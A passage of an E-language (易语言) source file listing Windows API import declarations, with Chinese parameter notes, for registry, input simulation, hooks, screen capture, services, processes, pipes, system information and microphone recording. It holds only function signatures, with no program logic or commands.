    .参数 句柄, 整数型, , 一个已打开项的句柄，或者指定一个标准项名
    .参数 表项索引, 整数型, , 欲获取值的索引。注意第一个值的索引编号为零
    .参数 子键名, 文本型, , 用于装载位于指定索引处值名的一个缓冲区
    .参数 子键长度, 整数型, 传址, 用于装载lpValueName缓冲区长度的一个变量。一旦返回，它会设为实际载入缓冲区的字符数量
    .参数 lpReserved, 整数型, , 未用设为零
    .参数 键值类型, 整数型, 传址, 值的类型，用于装载值的类型代码的变量
    .参数 键值数据, 字节集, 传址, 用于装载值数据的一个缓冲区
    .参数 键值缓寸, 整数型, 传址, 用于装载lpData缓冲区长度的一个变量。一旦返回，它会设为实际载入缓冲区的字符数量

.DLL命令 RegOpenKeyA, 整数型, "advapi32.dll", "RegOpenKeyA", , 打开一个现有的注册表项  零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
    .参数 hKey, 整数型, , 一个已打开项的句柄，或指定一个标准项名
    .参数 lpSubKey, 文本型, , 要打开的项名
    .参数 phkResult, 整数型, 传址, 指定一个变量，用于装载（保存）打开注册表项的一个句柄;

.DLL命令 RegCloseKey, 整数型, "advapi32.dll", "RegCloseKey", , 关闭系统注册表中的一个项（或键）  零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
    .参数 hKey, 整数型, , 要关闭的项;

.DLL命令 RegEnumKeyA, 整数型, "advapi32.dll", "RegEnumKeyA", , 
    .参数 hKey, 整数型, , 
    .参数 dwIndex, 整数型, , 
    .参数 lpName, 文本型, 传址, 
    .参数 cbName, 整数型, , 

.DLL命令 RegDeleteValueA, 整数型, "advapi32.dll", "RegDeleteValueA", , 
    .参数 hKey, 整数型, , 
    .参数 lpValueName, 文本型, , 

.DLL命令 RegQueryValueExA, 整数型, "advapi32.dll", "RegQueryValueExA", , 获取一个项的设置值  零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
    .参数 hKey, 整数型, , 一个已打开项的句柄，或者指定一个标准项名
    .参数 lpValueName, 文本型, , 要获取值的名字
    .参数 lpReserved, 整数型, , 未用，设为零
    .参数 lpType, 整数型, 传址, 用于装载取回数据类型的一个变量
    .参数 lpData, 字节集, 传址, 用于装载指定值的一个缓冲区
    .参数 lpcbData, 整数型, 传址, 用于装载lpData缓冲区长度的一个变量。一旦返回，它会设为实际装载到缓冲区的字节数;

.DLL命令 RegSetValueExA, 整数型, "advapi32.dll", "RegSetValueExA", , RegSetValue，零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
    .参数 hKey, 整数型, , 
    .参数 pValueName, 文本型, , 
    .参数 Reserved, 整数型, , Long，未用，设为零
    .参数 dwType, 整数型, , 
    .参数 lpData, 文本型, 传址, 
    .参数 cbData, 整数型, , 

.DLL命令 BlockInput, 整数型, "", "BlockInput", 公开, BlockInput
    .参数 是否锁定, 整数型, , fBlock 1.锁定，0.解除

.DLL命令 SetCursorPos, 整数型, "user32.dll", "SetCursorPos", 公开, 设置鼠标坐标_,,非零表示成功，零表示失败
    .参数 水平位置, 整数型, , 鼠标指针在屏幕像素坐标系统中的水平位置
    .参数 垂直位置, 整数型, , 鼠标指针在屏幕像素坐标系统中的垂直位置

.DLL命令 GetCursorPos, 整数型, "user32", "GetCursorPos", 公开, 取鼠标位置_
    .参数 位置, 鼠标坐标, , 

.DLL命令 SwapMouseButton, 整数型, "user32.dll", "SwapMouseButton", 公开, 鼠标左右键,,决定是否互换鼠标左右键的功能  TRUE（非零）表示鼠标按钮的功能在调用这个函数之前已经互换；否则返回零
    .参数 鼠标按钮的功能, 整数型, , 倘若为TRUE（非零），则互换两个鼠标按钮的功能。FALSE则恢复正常状态;

.DLL命令 SetCapture, 整数型, "user32", "SetCapture", 公开, 俘获鼠标_
    .参数 窗口句柄, 整数型, 传址, 

.DLL命令 ReleaseCapture, 整数型, "user32", "ReleaseCapture", 公开, 释放鼠标_

.DLL命令 mouse_event, 空白型, "user32.dll", "mouse_event", 公开, 模拟鼠标_,,mouse_event,模拟一次鼠标事件  没有返回值
    .参数 标志组合, 整数型, , dwFlags，一系列标志的组合 dwFlags，一系列标志的组合  3为按下鼠标        相关标志自己去网上查下 
    .参数 水平方向, 整数型, , dx，参见相关帮助
    .参数 垂直方向, 整数型, , dy，参见相关帮助
    .参数 数据信息, 整数型, , cButtons，未使用
    .参数 扩展数据信息, 整数型, , dwExtraInfo，通常未用的一个值

.DLL命令 GetDoubleClickTime, 整数型, "user32", "GetDoubleClickTime", 公开, 取鼠标的双击间隔时间_,,得到鼠标的双击间隔速度  GetDoubleClickTime  一般鼠标设置的双击时间为 500 

.DLL命令 SetDoubleClickTime, 整数型, "user32", "SetDoubleClickTime", 公开, 设置鼠标的双击间隔时间_,,SetDoubleClickTime  失败返回0
    .参数 时间, 整数型, , 

.DLL命令 IsDebuggerPresent, 整数型, "kernel32.dll", "IsDebuggerPresent", 公开, 当前是否为调试版_,,非0则当前进程正在调试器的描述表中运行 否则  当前进程没有在调试器的描述表中运行

.DLL命令 ExitWindowsEx, 整数型, "user32.dll", "ExitWindowsEx", 公开, 关闭系统_,,ExitWindowsEx  Long，非零表示成功，零表示失败。会设置GetLastError，退出windows，并用特定的选项重新启动
    .参数 标志, 整数型, , uFlags,指定一个或多个标志的组合uFlags,指定一个或多个标志的组合 EWX_FORCE=4; //关闭所有程序并以其他用户身份登录    EWX_LOGOFF=0; //重新启动计算机并切换到MS-DOS方式 中止进程，然后注销  EWX_SHUTDOWN=1;//关闭计算机 关掉系统电源（如果可能的话，ATX电源就可以）  EWX_REBOOT=2; //重新启动计算机  重新引导系统 
    .参数 保留值, 整数型, , dwReserved,保留，设为零65535

.DLL命令 SetComputerNameA, 整数型, "kernel32", "SetComputerNameA", 公开, 设置计算机名 SetComputerNameA Long，非零表示成功，零表示失败。会设置GetLastError  windows95会将任何非法字符自动转换到标准的字符集里。windows nt则会报告出错 一般要重新启动才生效
    .参数 新的计算机名称, 文本型, , lpComputerName String，新的计算机名称。最多可有MAX_COMPUTERNAME_LENGTH个字符   

.DLL命令 重新启动系统设置, 整数型, "shell32.dll", "#59", 公开, #59重新启动系统设置_
    .参数 窗口句柄, 整数型, , hOwner
    .参数 额外提示, 整数型, , sExtraPrompt
    .参数 标志, 整数型, , uFlags EWX_FORCE=4 EWX_SHUTDOWN=1

.DLL命令 GetUserDefaultLangID, 整数型, "kernel32", "GetUserDefaultLangID", 公开, 取默认语言ID_,,GetUserDefaultLangID

.DLL命令 GetUserDefaultLCID, 整数型, "kernel32", "GetUserDefaultLCID", 公开, 取默认地方设置_,,GetUserDefaultLCID

.DLL命令 GetUserNameA, 整数型, "advapi32.dll", "GetUserNameA", 公开, 取当前用户名_,,GetUserNameA  Long，TRUE（非零）表示成功，否则返回零。例如:Administrator
    .参数 字串缓冲区, 文本型, , lpBuffer String，一个字串缓冲区，预先初始化成由nSize指定的长度。它将用于容纳用户名
    .参数 字串缓冲长度, 整数型, 传址, nSize  Long，初始化成lpBuffer的长度。返回以后，它会包含载入lpBuffer的字符数量

.DLL命令 GetUserNameExA, 整数型, "secur32.dll", "GetUserNameExA", 公开, 取当前用户名扩展_,,GetUserNameExA Long，TRUE（非零）表示成功，否则返回零 如:PC-200804121120\Administrator
    .参数 用户名格式化, 整数型, , NameFormat 一般为 NameSamCompatible=2
    .参数 用户名缓冲区, 文本型, , lpNameBuffer
    .参数 缓冲区大小, 整数型, 传址, nSize

.DLL命令 FindFirstFile, 整数型, "kernel32", "FindFirstFileA", , 
    .参数 lpFileName, 文本型, , 
    .参数 lpFindFileData, WIN32_FIND_DATA, , 

.DLL命令 SYSTEMTIME转换成DATE, 整数型, "oleaut32.dll", "SystemTimeToVariantTime", , 
    .参数 LPSYSTEMTIME, 系统时间, 传址, 
    .参数 double, 日期时间型, 传址, 

.DLL命令 PathRemoveFileSpec, 整数型, "shlwapi.dll", "PathRemoveFileSpecA", , 
    .参数 pszPath, 文本型, , 

.DLL命令 lstrcpyn, 文本型, "kernel32", "lstrcpynA", , 
    .参数 lpString1, 字节型, 数组, 
    .参数 lpString2, 字节型, , 
    .参数 iMaxLength, 整数型, , 

.DLL命令 下一个钩子, 整数型, "", "CallNextHookEx", 公开, 钩子
    .参数 hHook, 整数型, , 
    .参数 icode, 整数型, , 
    .参数 wParam, 整数型, , 
    .参数 lParam, 整数型, , 

.DLL命令 FileTimeToSystemTime, 整数型, "kernel32", "FileTimeToSystemTime", , 
    .参数 lpFileTime, FILETIME, 传址, 
    .参数 lpSystemTime, 系统时间, 传址, 

.DLL命令 FindClose, 整数型, "kernel32", "FindClose", , 
    .参数 hFindFile, 整数型, , 

.DLL命令 FindNextFile, 整数型, "kernel32", "FindNextFileA", , 
    .参数 hFindFile, 整数型, , 
    .参数 lpFindFileData, WIN32_FIND_DATA, , 

.DLL命令 CopyMemoryP, 空白型, "", "RtlMoveMemory", , kernel32.dll
    .参数 Dest, 整数型, , 
    .参数 Source, MSG, , 
    .参数 Length, 整数型, , 

.DLL命令 _回调钩子, 整数型, "", "CallWindowProcA", 公开, 
    .参数 窗口程序程序指针, 子程序指针, , 
    .参数 窗口句柄, 整数型, , 
    .参数 消息, 整数型, , 
    .参数 参数1, 整数型, , 
    .参数 参数2, 整数型, , 

.DLL命令 CopyMemoryR, 空白型, "", "RtlMoveMemory", , kernel32.dll
    .参数 Dest, MSG, , 
    .参数 Source, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 _取模块句柄, 整数型, "", "GetModuleHandleA", 公开, 
    .参数 lpModuleName, 整数型, , 

.DLL命令 卸载钩子_, 整数型, "", "UnhookWindowsHookEx", 公开, 钩子
    .参数 hHook, 整数型, , 

.DLL命令 安装钩子_, 整数型, "", "SetWindowsHookExA", 公开, 钩子
    .参数 ihook, 整数型, , 
    .参数 lpfunc, 子程序指针, , 
    .参数 hin, 整数型, , 
    .参数 threadid, 整数型, , 

.DLL命令 _键盘输入, 整数型, "", "SendInput", , 返回被成功地插人输入流中的事件数目。若要获得更多的错误信息，可以调用GetlastError函数
    .参数 键盘输入数组数, 整数型, , 定义plnputs指向的结构的数目。
    .参数 键盘输入, 键盘输入_, 传址, 0=鼠标, 1=键盘
    .参数 键盘输入结构长度, 整数型, , 结构长度

.DLL命令 _键码转换, 整数型, "", "MapVirtualKeyA", 公开, 返回转换后的代码
    .参数 wCode, 整数型, , 代码值
    .参数 wMapType, 整数型, , 0--虚拟键码->扫描码；1--扫描码->虚拟键码；2-虚拟键码->ASCII值（未加Shift组合键）。

.DLL命令 _鼠标输入, 整数型, "", "SendInput", , 返回被成功地插人输入流中的事件数目。若要获得更多的错误信息，可以调用GetlastError函数
    .参数 鼠标输入数组数, 整数型, , 定义plnputs指向的结构的数目。
    .参数 鼠标输入, 鼠标输入_, 传址, 0=鼠标, 1=键盘
    .参数 鼠标输入结构长度, 整数型, , 结构长度 28

.DLL命令 _判断鼠标双击间隔, 整数型, "", "GetDoubleClickTime", 公开, 判断连续两次鼠标单击之间会被处理成双击事件的间隔时间 以毫秒表示的双击时间

.DLL命令 CopyMemory_BITMAPINFO, 整数型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 Destination, 字节型, 传址, 
    .参数 Source, BITMAPINFO, , 
    .参数 Length, 整数型, , 

.DLL命令 CopyMemory_BITMAPFILEHEADER, 整数型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 Destination, 字节型, 传址, 
    .参数 Source, BITMAPFILEHEADER, , 
    .参数 Length, 整数型, , 

.DLL命令 复制内存_字节集到字节集, 整数型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 pDestination, 字节型, 传址, 
    .参数 pSource, 字节型, 传址, 
    .参数 Length, 整数型, , 

.DLL命令 GetDC, 整数型, "user32.dll", "GetDC", , 获取指定窗口的设备场景  指定窗口的设备场景句柄，出错则为0
    .参数 窗口的句柄, 整数型, , 将获取其设备场景的窗口的句柄。若为0，则要获取整个屏幕的DC;

.DLL命令 CreateCompatibleDC, 整数型, "Gdi32.dll", "CreateCompatibleDC", , 
    .参数 hdc, 整数型, , 

.DLL命令 SelectObject, 整数型, "gdi32.dll", "SelectObject", , 
    .参数 hdc, 整数型, , 
    .参数 hgdiobj, 整数型, , 

.DLL命令 CreateDIBSection, 整数型, "gdi32.dll", "CreateDIBSection", , 
    .参数 设备场景句柄, 整数型, , 
    .参数 位图数据, 字节集, 传址, 
    .参数 常数, 整数型, , 
    .参数 内存地址, 整数型, 传址, 
    .参数 文件映射句柄, 整数型, , 
    .参数 偏移量, 整数型, , 

.DLL命令 BitBlt, 整数型, "gdi32.dll", "BitBlt", , 
    .参数 hdcDest, 整数型, , 
    .参数 nXDest, 整数型, , 
    .参数 nYDest, 整数型, , 
    .参数 nWidth, 整数型, , 
    .参数 nHeight, 整数型, , 
    .参数 hdcSrc, 整数型, , 
    .参数 nXSrc, 整数型, , 
    .参数 nYSrc, 整数型, , 
    .参数 dwRop, 整数型, , 

.DLL命令 复制内存_字节集, 整数型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 pDestination, 字节型, 传址, 
    .参数 pSource, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 DeleteDC, 整数型, "gdi32.dll", "DeleteDC", , 
    .参数 hdc, 空白型, , 

.DLL命令 DeleteObject, 逻辑型, "gdi32.dll", "DeleteObject", , 
    .参数 hObject, 整数型, , 

.DLL命令 ReleaseDC, 整数型, "user32.dll", "ReleaseDC", , ReleaseDC
    .参数 窗口句柄, 整数型, , hwnd，要释放的设备场景相关的窗口句柄
    .参数 设备场景, 整数型, , hdc，要释放的设备场景句柄

.DLL命令 模拟键盘行动_, 整数型, "user32.dll", "keybd_event", , 这个函数模拟了键盘行动
    .参数 键代码, 空白型, , bVk,欲模拟的虚拟键码
    .参数 键扫描码, 空白型, , bScan,键的OEM扫描码
    .参数 标志值, 空白型, , dwFlags,标志常数
    .参数 特定值, 空白型, , dwExtraInfo,通常不用的一个值

.DLL命令 模拟鼠标, 空白型, "user32.dll", "mouse_event", , 
    .参数 dwFlags, 空白型, , 
    .参数 dx, 空白型, , 
    .参数 dy, 空白型, , 
    .参数 cButtons, 空白型, , 
    .参数 dwExtraInfo, 空白型, , 

.DLL命令 SetScrollInfo, 整数型, "user32.dll", "SetScrollInfo", , 
    .参数 hwnd, 整数型, , 
    .参数 n, 整数型, , 
    .参数 lpcScrollInfo, SCROLLINFO, , 
    .参数 bool, 逻辑型, , 

.DLL命令 ShowScrollBar, 整数型, "user32.dll", "ShowScrollBar", , , ShowScrollBar
    .参数 窗口句柄, 整数型, , hwnd
    .参数 滚动条标志, 整数型, , wBar
    .参数 显示标志, 整数型, , bShow

.DLL命令 取得窗口信息_, 整数型, "user32.dll", "GetWindowLongA", , 从指定窗口的结构中取得信息  由nIndex决定。零表示出错。会设置GetLastError
    .参数 窗口句柄, 整数型, , 欲为其获取信息的窗口的句柄
    .参数 属性, 整数型, , 欲取回的信息，可以是下述任何一个常数：;GWL_EXSTYLE：扩展窗口样式;GWL_STYLE：窗口样式;GWL_WNDPROC：该窗口的窗口函数的地址;GWL_HINSTANCE：拥有窗口的实例的句柄;GWL_HWNDPARENT：该窗口之父的句柄。不要用SetWindowWord来改变这个值;GWL_ID：对话框中一个子窗口的标识符;GWL_USERDATA：含义由应用程序规定;DWL_DLGPROC：这个窗口的对话框函数地址;DWL_MSGRESULT：在对话框函数中处理的一条消息返回的值;DWL_USER：含义由应用程序规定;

.DLL命令 设置窗口信息_, 整数型, "user32.dll", "SetWindowLongA", , 在窗口结构中为指定的窗口设置信息  指定数据的前一个值
    .参数 窗口句柄, 整数型, , hwnd，欲为其取得信息的窗口的句柄
    .参数 窗口信息值, 整数型, , nIndex，请参考GetWindowLong函数的nIndex参数的说明
    .参数 窗口信息新值, 整数型, , dwNewLong，由nIndex指定的窗口信息的新值

.DLL命令 GetScrollInfo, 整数型, "user32", "GetScrollInfo", , 
    .参数 hwnd, 整数型, , 
    .参数 n, 整数型, , 
    .参数 lpcScrollInfo, SCROLLINFO, , 

.DLL命令 API_ControlService, 整数型, "advapi32.dll", "ControlService", , 向服务器发送控件
    .参数 hService, 整数型, , 
    .参数 dwControl, 整数型, , 
    .参数 lpServiceStatus, 服务状态, 传址, 

.DLL命令 API_StartService, 整数型, "advapi32.dll", "StartServiceA", , 开始运行服务
    .参数 hService, 整数型, , 
    .参数 dwNumServiceArgs, 整数型, , 
    .参数 lpServiceArgVectors, 整数型, , 

.DLL命令 API_QueryServiceStatusEx, 整数型, "ADVAPI32.DLL", "QueryServiceStatusEx", , 
    .参数 hService, 整数型, , 
    .参数 InfoLevel, 整数型, , 
    .参数 lpBuffer, 字节集, , 
    .参数 cbBufSize, 整数型, , 
    .参数 pcbBytesNeeded, 整数型, 传址, 

.DLL命令 API_QueryServiceStatus, 整数型, "advapi32.dll", "QueryServiceStatus", , 获取服务状态
    .参数 hService, 整数型, , 
    .参数 lpServiceStatus, 服务状态, 传址, 

.DLL命令 OpenService, 整数型, "Advapi32.dll", "OpenServiceA", , 
    .参数 hSCManager, 整数型, , 
    .参数 lpServiceName, 文本型, , 
    .参数 dwDesiredAccess, 整数型, , 

.DLL命令 RtlMoveMemory, 整数型, "", "RtlMoveMemory", , 
    .参数 Destination, ENUM_SERVICE_STATUS_PROCESS, , 
    .参数 Source, 字节集, , 
    .参数 Length, 整数型, , 

.DLL命令 API_EnumServicesStatusEx, 整数型, "ADVAPI32.DLL", "EnumServicesStatusExA", , 
    .参数 hSCManager, 整数型, , 
    .参数 InfoLevel, 整数型, , 
    .参数 dwServiceType, 整数型, , 
    .参数 dwServiceState, 整数型, , 
    .参数 lpServices, 字节集, 传址, 
    .参数 cbBufSize, 整数型, , 
    .参数 pcbBytesNeeded, 整数型, 传址, 
    .参数 lpServicesReturned, 整数型, 传址, 
    .参数 lpResumeHandle, 整数型, , 
    .参数 pszGroupName, 整数型, , 

.DLL命令 API_OpenSCManager, 整数型, "advapi32.dll", "OpenSCManagerA", , 连接服务控件管理器
    .参数 lpMachineName, 整数型, , 
    .参数 lpDatabaseName, 整数型, , 
    .参数 dwDesiredAccess, 整数型, , 

.DLL命令 SendMessage, 整数型, "user32", "SendMessageA", 公开, 调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。SendMessageBynum， ;    SendMessageByString是该函数的“类型安全”声明形式  由具体的消息决定
    .参数 窗口句柄, 整数型, , 要接收消息的那个窗口的句柄
    .参数 信息值, 整数型, , 消息的标识符
    .参数 参数一, 整数型, , 具体取决于消息
    .参数 参数二, 整数型, , 具体取决于消息;

.DLL命令 GetWindowText_, 整数型, "", "GetWindowTextA", , 
    .参数 win, 整数型, , 
    .参数 wb, 文本型, , 
    .参数 cd, 整数型, , 

.DLL命令 RegOpenKeyExA, 整数型, "", "RegOpenKeyExA", 公开, 打开注册表项
    .参数 hKey, 整数型, , 
    .参数 lpSubKey, 文本型, , 
    .参数 ulOptions, 整数型, , 
    .参数 samDesired, 整数型, , 
    .参数 phkResult, 整数型, 传址, 

.DLL命令 RegDeleteKeyA, 整数型, "", "RegDeleteKeyA", 公开, 
    .参数 hKey, 整数型, , 
    .参数 lpSubKey, 文本型, , 

.DLL命令 RegQueryValueEx, 整数型, "advapi32.dll", "RegQueryValueExA", , 获取一个项的设置值  零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
    .参数 hKey, 整数型, , 一个已打开项的句柄，或者指定一个标准项名
    .参数 lpValueName, 文本型, , 要获取值的名字
    .参数 lpReserved, 整数型, , 未用，设为零
    .参数 lpType, 整数型, 传址, 用于装载取回数据类型的一个变量
    .参数 lpData, 字节集, 传址, 用于装载指定值的一个缓冲区
    .参数 lpcbData, 整数型, 传址, 用于装载lpData缓冲区长度的一个变量。一旦返回，它会设为实际装载到缓冲区的字节数;

.DLL命令 RegEnumValue, 整数型, "", "RegEnumValueA", , 
    .参数 hkey, 空白型, , 
    .参数 dwIndex, 空白型, , 
    .参数 lpValueName, 文本型, , 
    .参数 lpcbValueName, 空白型, 传址, 
    .参数 lpReserved, 空白型, , 
    .参数 lpType, 空白型, , 
    .参数 lpData, 空白型, , 
    .参数 lpcbData, 空白型, , 

.DLL命令 RegEnumKeyEx, 整数型, "", "RegEnumKeyExA", , 
    .参数 hKey, 空白型, , 
    .参数 dwIndex, 空白型, , 
    .参数 lpName, 文本型, , 
    .参数 lpcbName, 空白型, 传址, 
    .参数 lpReserved, 空白型, , 
    .参数 lpClass, 空白型, , 
    .参数 lpcbClass, 空白型, 传址, 
    .参数 lpftLastWriteTime, 空白型, , 

.DLL命令 FindWindowEx, 整数型, "", "FindWindowExA", , 
    .参数 hwnd1, 整数型, , 
    .参数 hwnd2, 整数型, , 
    .参数 lpsz1, 整数型, , 
    .参数 lpsz2, 整数型, , 

.DLL命令 Process32Next, 逻辑型, "kernel32.dll", "Process32Next", 公开, 下个进程结构
    .参数 快照句柄, 整数型, , 
    .参数 进程结构, 进程结构, 传址, 

.DLL命令 Process32First, 逻辑型, "kernel32.dll", "Process32First", 公开, 取进程快照第一个进程信息返回内存指针
    .参数 快照句柄, 整数型, , 
    .参数 进程结构, 进程结构, 传址, 

.DLL命令 取磁盘容量, 整数型, "kernel32", "GetDiskFreeSpaceA", , 
    .参数 根路径, 文本型, , 
    .参数 簇内扇区容量, 长整数型, 传址, 
    .参数 扇区内字节容量, 长整数型, 传址, 
    .参数 剩余簇, 长整数型, 传址, 
    .参数 总簇, 长整数型, 传址, 

.DLL命令 判断硬盘类型, 整数型, "", "GetDriveTypeA", , 3为本地硬盘，5为光盘，4为映射，1没找到
    .参数 盘符, 文本型, , 如："C：\"

.DLL命令 _取计算机名, 整数型, "", "GetComputerNameA", , kernel32.dll取出当前完整的计算机名称，TRUE（非零）表示成功，否则返回零。
    .参数 字串缓冲区, 文本型, , lpBuffer，随同计算机名载入的字串缓冲区
    .参数 缓冲区长度, 整数型, 传址, nSize，缓冲区的长度。这个变量随同返回计算机名的实际长度载入

.DLL命令 _取用户名, 整数型, "", "GetUserNameA", , advapi32.dll取出当前的用户名,TRUE（非零）表示成功，否则返回零。
    .参数 字串缓冲区, 文本型, , lpBuffer，随同用户名载入的字串缓冲区
    .参数 缓冲区长度, 整数型, 传址, nSize，缓冲区的长度。这个变量随同返回用户名的实际长度载入

.DLL命令 EnumDisplaySettings, 整数型, "", "EnumDisplaySettingsA", , 
    .参数 lpszDeviceName, 整数型, , 
    .参数 iModeNum, 整数型, , 
    .参数 lpDevMode, 短整数型, 传址, 

.DLL命令 GetModuleHandle, 整数型, "kernel32.dll", "GetModuleHandleA", , 
    .参数 lpModuleName, 文本型, , 

.DLL命令 IsWow64Process, 逻辑型, "kernel32.dll", "IsWow64Process", , 
    .参数 hProcess, 整数型, , 
    .参数 Wow64Process, 逻辑型, 传址, 

.DLL命令 QueryPerformanceFrequency, 整数型, "kernel32.dll", "QueryPerformanceFrequency", , 返回计数频率
    .参数 lpFrequency, 长整数型, 传址, 

.DLL命令 QueryPerformanceCounter, 整数型, "kernel32.dll", "QueryPerformanceCounter", , 获取计数值
    .参数 lpPerformanceCount, 长整数型, 传址, 

.DLL命令 GetVersionEx, 逻辑型, "kernel32", "GetVersionExA", , 
    .参数 lpVersionInformation, OSVERSIONINFOEX, 传址, 

.DLL命令 GetSystemInfo, 空白型, "kernel32.dll", "GetSystemInfo", , 
    .参数 lpSystemInfo, 低层平台信息系统信息, , 

.DLL命令 GetSystemDirectoryA, 整数型, "kernel32.dll", "GetSystemDirectoryA", , 
    .参数 缓冲区, 文本型, , 
    .参数 缓冲区长度, 整数型, , 

.DLL命令 从列表id取路径, 整数型, "shell32.dll", "SHGetPathFromIDList", , 
    .参数 结构指针, 整数型, , pIdl
    .参数 路径, 文本型, 传址, pszPath

.DLL命令 获取特别文件夹位置, 整数型, "shell32.dll", "SHGetSpecialFolderLocation", , 
    .参数 窗口句柄, 整数型, , hwndOwner
    .参数 文件夹位置, 短整数型, , nFolder
    .参数 结构, 整数型, 传址, pIdl

.DLL命令 GetWindowsDirectoryA, 整数型, "kernel32.dll", "GetWindowsDirectoryA", , 
    .参数 缓冲区, 文本型, , 
    .参数 缓冲区长度, 整数型, , 

.DLL命令 取全局内存状态_, 整数型, "kernel32", "GlobalMemoryStatus", , $(b)
    .参数 缓冲区结构, 内存状态_, , lpBuffer

.DLL命令 取地址_, 整数型, "kernel32", "lstrcpynA", 公开, 
    .参数 数据1, 字节集, , 
    .参数 数据2, 字节集, , 
    .参数 数据长度, 整数型, , 

.DLL命令 查找录音设备, 整数型, "winmm.dll", "waveInGetNumDevs", , 

.DLL命令 打开录音设备, 整数型, "winmm.dll", "waveInOpen", , 
    .参数 lphWaveIn, 整数型, 传址, 
    .参数 uDeviceID, 整数型, , 
    .参数 lpFormat, WAVEFORMATEX, , 
    .参数 dwCallbac, 子程序指针, , 
    .参数 dwInstance, 整数型, , 
    .参数 dwFlags, 整数型, , 

.DLL命令 准备缓冲, 整数型, "winmm.dll", "waveInPrepareHeader", , 
    .参数 hWaveIn, 整数型, , 
    .参数 lpWaveInHdr, WAVEHDR, , 
    .参数 uSize, 整数型, , 

.DLL命令 清除缓冲, 整数型, "winmm.dll", "waveInUnprepareHeader", , 
    .参数 hWaveIn, 整数型, , 
    .参数 lpWaveInHdr, WAVEHDR, , 
    .参数 uSize, 整数型, , 

.DLL命令 增加缓冲, 整数型, "winmm.dll", "waveInAddBuffer", , 
    .参数 hWaveIn, 整数型, , 
    .参数 lpWaveInHdr, WAVEHDR, , 
    .参数 uSize, 整数型, , 

.DLL命令 开始录音, 整数型, "winmm.dll", "waveInStart", , 开始录音
    .参数 hWaveIn, 整数型, , 

.DLL命令 waveInReset, 整数型, "winmm.dll", "waveInReset", , 
    .参数 hWaveIn, 整数型, , 

.DLL命令 关闭录音设备, 整数型, "winmm.dll", "waveInClose", , 
    .参数 hWaveIn, 整数型, , 

.DLL命令 停止录音, 整数型, "winmm.dll", "waveInStop", , 停止声音输入
    .参数 hWaveIn, 整数型, , 

.DLL命令 执行文件DLL, 整数型, "", "ShellExecuteA", , 大于32表示成功
    .参数 hwnd, 整数型, , 
    .参数 执行命令, 文本型, , 
    .参数 执行路径, 文本型, , 
    .参数 执行程序的参数, 文本型, , 
    .参数 默认路径, 文本型, , 
    .参数 nShowCmd, 整数型, , 0：隐藏窗口,1：普通激活,2：最小化激活,3：最大化激活,4：普通不激活,5：普通激活,6：最小化不激活,7：最小化不激活,8：不激活

.DLL命令 删除指定目录_, 整数型, "kernel32.dll", "RemoveDirectoryA", , 
    .参数 目录的名字, 文本型, , lppatename，String，要删除的那个目录的名字

.DLL命令 创建目录_, 整数型, "kernel32.dll", "CreateDirectoryA", , 
    .参数 模板目录, 文本型, , 
    .参数 目录安全性结构, d安全性结构_, , lpSecurityAttributes，这个结构定义了目录的安全特性

.DLL命令 创建匿名管道, 整数型, "", "CreatePipe", , 
    .参数 输出管道, 整数型, 传址, 
    .参数 输入管道, 整数型, 传址, 
    .参数 管道属性, 安全属性, 传址, 
    .参数 尺寸, 整数型, , 

.DLL命令 创建进程, 整数型, "", "CreateProcessA", , 
    .参数 程序名称, 整数型, , 32位程序用，可设为文本型
    .参数 命令行, 文本型, , 
    .参数 进程属性, 整数型, , 
    .参数 线程属性, 整数型, , 
    .参数 参数一, 整数型, , 
    .参数 参数二, 整数型, , 
    .参数 参数三, 整数型, , 
    .参数 运行目录, 文本型, , 如需指定运行目录设为文本行
    .参数 启动信息, 启动信息, , 
    .参数 进程信息, 进程信息, , 

.DLL命令 _读文件, 整数型, "", "ReadFile", , 
    .参数 文件号, 整数型, , 
    .参数 缓存, 字节集, 传址, 
    .参数 读取尺寸, 整数型, , 
    .参数 实际尺寸, 整数型, 传址, 
    .参数 参数, 整数型, , 

.DLL命令 写文件, 整数型, "", "WriteFile", , 
    .参数 文件号, 整数型, , 
    .参数 写入内容, 字节集, 传址, 
    .参数 写入尺寸, 整数型, , 
    .参数 实际尺寸, 整数型, 传址, 
    .参数 参数, 整数型, , 

.DLL命令 关闭句柄, 整数型, "", "CloseHandle", , 
    .参数 句柄, 整数型, , 

.DLL命令 获取进程状态, 整数型, "", "GetExitCodeProcess", , 
    .参数 进程号, 整数型, , 
    .参数 进程状态, 整数型, 传址, 

.DLL命令 获取启动信息_, 整数型, "kernel32", "GetStartupInfoA", , 
    .参数 启动信息, 启动信息, 传址, 

.DLL命令 结束进程, 逻辑型, "", "TerminateProcess", , 
    .参数 指定进程, 整数型, , 
    .参数 退出标记, 整数型, , 

.DLL命令 打开进程句柄, 整数型, "", "OpenProcess", , 
    .参数 访问方法, 整数型, , 
    .参数 子程序继承, 逻辑型, , 是否由子程序继承
    .参数 进程标识符, 整数型, , 

.DLL命令 关闭对象, 整数型, "kernel32", "CloseHandle", , 可关闭文件与映射
    .参数 对象句柄, 整数型, , 

.DLL命令 取错误代码, 整数型, "kernel32", "GetLastError", , 

.DLL命令 创建映射, 整数型, "kernel32", "CreateFileMappingA", , 创建文件映射对象。成功就返回文件映射对象句柄
    .参数 文件句柄, 整数型, , 欲在其中创建映射的一个已经打开的磁盘文件句柄
    .参数 安全对象, 整数型, , 通常用0表示使用默认安全对象
    .参数 映射方式, 整数型, , 打开映射的方式（用API常数表示的读/写或其它） 2表示只读，4表示可读写
    .参数 高32位, 整数型, , 表示文件映射的最大长度的高32位。通常均设为0表示磁盘文件的实际长度
    .参数 低32位, 整数型, , 表示文件映射的最大长度的低32位。通常均设为0表示磁盘文件的实际长度
    .参数 对象名字, 整数型, , 指定文件映射对象的名称

.DLL命令 映射装载, 整数型, "kernel32.dll", "MapViewOfFile", , 将一个文件映射对象映射到当前应用程序空间。成功就返回文件映射在内存中的起始地址
    .参数 映射句柄, 整数型, , 文件映射对象的句柄
